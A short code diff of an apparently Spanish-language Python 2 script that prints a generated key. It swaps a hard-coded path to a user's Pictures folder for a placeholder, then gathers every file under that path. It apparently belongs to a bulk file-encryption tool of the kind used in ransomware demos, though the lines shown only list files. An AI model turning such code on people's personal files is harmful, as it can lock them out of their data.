@@ -39,7 +39,9 @@ print '\nLa clave generada es: %s' % clave
 
 lista = []
 walk = os.walk
-ruta = 'C:\\Users\\elguapoRoot\\Pictures'
+
+ruta = 'YOUR PATH HERE'
+
 for raiz, subdirectorios, archivos in walk(ruta):
     for archivos in fnmatch.filter(archivos, '*'):
         lista.append(os.path.join(raiz, archivos))
